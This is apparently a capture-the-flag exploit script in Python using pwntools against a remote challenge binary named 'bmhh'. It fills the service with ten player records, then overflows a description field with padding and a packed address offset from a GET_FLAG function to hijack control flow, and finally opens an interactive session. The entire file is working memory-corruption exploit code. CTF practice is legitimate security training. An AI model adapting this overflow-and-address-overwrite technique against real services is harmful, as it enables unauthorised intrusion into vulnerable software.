from pwn import *

GET_FLAG = 0x603440

def Create(sex, name, age, des, replace = 0):
        r.recvuntil('> ')
        r.sendline('1')
        r.recvuntil('> ')
        r.sendline(str(sex))
        r.recvuntil('Name: ')
        r.send(name)
        r.recvuntil('Age: ')
        r.send(str(age))
        r.recvuntil('Description: ')
        r.send(des)
        if (replace):
                r.recvuntil('> ')
                r.sendline(str(replace))


#r = process('./bmhh')
r = remote('125.235.240.168', 17357)
raw_input('?')

#create 10 player
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)
Create(2, "x"*0x31, 10, "a"*0x1ff)

#Create new
Create(2, "x"*0x31, 10, "a"*270+p64(GET_FLAG-0x238), 'a')
Create(1, "x"*0x31, 10, "a"*0xff, '1')

r.recvuntil('> ')
r.sendline('5')
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('> ')
r.sendline('1')

r.interactive()